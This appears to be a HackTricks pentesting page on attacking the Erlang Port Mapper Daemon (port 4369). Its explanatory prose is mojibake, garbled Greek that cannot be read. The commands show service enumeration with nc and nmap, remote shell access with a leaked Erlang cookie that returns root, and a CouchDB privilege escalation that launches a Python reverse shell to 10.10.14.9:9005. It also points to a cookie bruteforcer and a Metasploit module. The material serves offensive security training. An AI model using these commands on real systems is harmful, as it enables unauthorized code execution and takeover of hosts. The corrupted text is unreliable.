{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


# Basic Info

ÎŸ **Erlang Port Mapper Daemon (epmd)** Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Ï‰Ï‚ ÏƒÏ…Î½Ï„Î¿Î½Î¹ÏƒÏ„Î®Ï‚ Î³Î¹Î± ÎºÎ±Ï„Î±Î½ÎµÎ¼Î·Î¼Î­Î½ÎµÏ‚ Ï€Î±ÏÎ¿Ï…ÏƒÎ¯ÎµÏ‚ Erlang. Î•Î¯Î½Î±Î¹ Ï…Ï€ÎµÏÎ¸Ï…Î½Î¿Ï‚ Î³Î¹Î± Ï„Î·Î½ Î±Î½Ï„Î¹ÏƒÏ„Î¿Î¯Ï‡Î¹ÏƒÎ· ÏƒÏ…Î¼Î²Î¿Î»Î¹ÎºÏÎ½ Î¿Î½Î¿Î¼Î¬Ï„Ï‰Î½ ÎºÏŒÎ¼Î²Ï‰Î½ ÏƒÎµ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ Î¼Î·Ï‡Î±Î½ÏÎ½, Î´Î¹Î±ÏƒÏ†Î±Î»Î¯Î¶Î¿Î½Ï„Î±Ï‚ Î¿Ï…ÏƒÎ¹Î±ÏƒÏ„Î¹ÎºÎ¬ ÏŒÏ„Î¹ ÎºÎ¬Î¸Îµ ÏŒÎ½Î¿Î¼Î± ÎºÏŒÎ¼Î²Î¿Ï… ÏƒÏ‡ÎµÏ„Î¯Î¶ÎµÏ„Î±Î¹ Î¼Îµ Î¼Î¹Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·. Î‘Ï…Ï„ÏŒÏ‚ Î¿ ÏÏŒÎ»Î¿Ï‚ Ï„Î¿Ï… **epmd** ÎµÎ¯Î½Î±Î¹ ÎºÏÎ¯ÏƒÎ¹Î¼Î¿Ï‚ Î³Î¹Î± Ï„Î·Î½ Î±Ï€ÏÏŒÏƒÎºÎ¿Ï€Ï„Î· Î±Î»Î»Î·Î»ÎµÏ€Î¯Î´ÏÎ±ÏƒÎ· ÎºÎ±Î¹ ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î± Î¼ÎµÏ„Î±Î¾Ï Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÏÎ½ ÎºÏŒÎ¼Î²Ï‰Î½ Erlang ÏƒÎµ Î­Î½Î± Î´Î¯ÎºÏ„Ï…Î¿.

**Default port**: 4369
```
PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
```
Î‘Ï…Ï„ÏŒ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î® ÏƒÎµ ÎµÎ³ÎºÎ±Ï„Î±ÏƒÏ„Î¬ÏƒÎµÎ¹Ï‚ RabbitMQ ÎºÎ±Î¹ CouchDB.

# Î‘ÏÎ¹Î¸Î¼Î·Ï„Î¹ÎºÎ®

## Î§ÎµÎ¹ÏÎ¿ÎºÎ¯Î½Î·Ï„Î·
```bash
echo -n -e "\x00\x01\x6e" | nc -vn <IP> 4369

#Via Erlang, Download package from here: https://www.erlang-solutions.com/resources/download.html
dpkg -i esl-erlang_23.0-1~ubuntu~xenial_amd64.deb
apt-get install erlang
erl #Once Erlang is installed this will promp an erlang terminal
1> net_adm:names('<HOST>'). #This will return the listen addresses
```
## Î‘Ï…Ï„ÏŒÎ¼Î±Ï„Î·
```bash
nmap -sV -Pn -n -T4 -p 4369 --script epmd-info <IP>

PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info:
|   epmd_port: 4369
|   nodes:
|     bigcouch: 11502
|     freeswitch: 8031
|     ecallmgr: 11501
|     kazoo_apps: 11500
|_    kazoo-rabbitmq: 25672
```
# Erlang Cookie RCE

## Remote Connection

Î‘Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î´Î¹Î±ÏÏÎµÏÏƒÎµÏ„Îµ Ï„Î¿ Authentication cookie** Î¸Î± ÎµÎ¯ÏƒÏ„Îµ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ ÎºÏÎ´Î¹ÎºÎ± ÏƒÏ„Î¿Î½ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î®. Î£Ï…Î½Î®Î¸Ï‰Ï‚, Î±Ï…Ï„ÏŒ Ï„Î¿ cookie Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÏ„Î¿ `~/.erlang.cookie` ÎºÎ±Î¹ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ erlang ÎºÎ±Ï„Î¬ Ï„Î·Î½ Ï€ÏÏÏ„Î· ÎµÎºÎºÎ¯Î½Î·ÏƒÎ·. Î‘Î½ Î´ÎµÎ½ Î­Ï‡ÎµÎ¹ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î® Î¿ÏÎ¹ÏƒÏ„ÎµÎ¯ Ï‡ÎµÎ¹ÏÎ¿ÎºÎ¯Î½Î·Ï„Î±, ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± Ï„Ï…Ï‡Î±Î¯Î± ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÎ¬ \[A:Z] Î¼Îµ Î¼Î®ÎºÎ¿Ï‚ 20 Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÏ‰Î½.
```bash
greif@baldr ~$ erl -cookie YOURLEAKEDCOOKIE -name test2 -remsh test@target.fqdn
Erlang/OTP 19 [erts-8.1] [source] [64-bit] [async-threads:10]

Eshell V8.1 (abort with ^G)

At last, we can start an erlang shell on the remote system.

(test@target.fqdn)1>os:cmd("id").
"uid=0(root) gid=0(root) groups=0(root)\n"
```
Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ„Î¿ [https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/](https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/)\
ÎŸ ÏƒÏ…Î³Î³ÏÎ±Ï†Î­Î±Ï‚ Î¼Î¿Î¹ÏÎ¬Î¶ÎµÏ„Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î­Î½Î± Ï€ÏÏŒÎ³ÏÎ±Î¼Î¼Î± Î³Î¹Î± Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ brutforce Ï„Î¿ cookie:

{% file src="../.gitbook/assets/epmd_bf-0.1.tar.bz2" %}

## Î¤Î¿Ï€Î¹ÎºÎ® Î£ÏÎ½Î´ÎµÏƒÎ·

Î£Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Î¸Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„Î¿ÏÎ¼Îµ Ï„Î¿ CouchDB Î³Î¹Î± Î½Î± ÎºÎ»Î¹Î¼Î±ÎºÏÏƒÎ¿Ï…Î¼Îµ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Ï„Î¿Ï€Î¹ÎºÎ¬:
```bash
HOME=/ erl -sname anonymous -setcookie YOURLEAKEDCOOKIE
(anonymous@canape)1> rpc:call('couchdb@localhost', os, cmd, [whoami]).
"homer\n"
(anonymous@canape)4> rpc:call('couchdb@localhost', os, cmd, ["python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.9\", 9005));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"]).
```
Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ Î»Î·Ï†Î¸ÎµÎ¯ Î±Ï€ÏŒ [https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution)\
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ **Canape HTB machine Î³Î¹Î±** **Î½Î± ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ** ÏƒÏ„Î¿ Ï€ÏÏ‚ Î½Î± **ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±**.

## Metasploit
```bash
#Metasploit can also exploit this if you know the cookie
msf5> use exploit/multi/misc/erlang_cookie_rce
```
# Shodan

* `port:4369 "ÏƒÏ„Î· Î¸ÏÏÎ±"`


{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
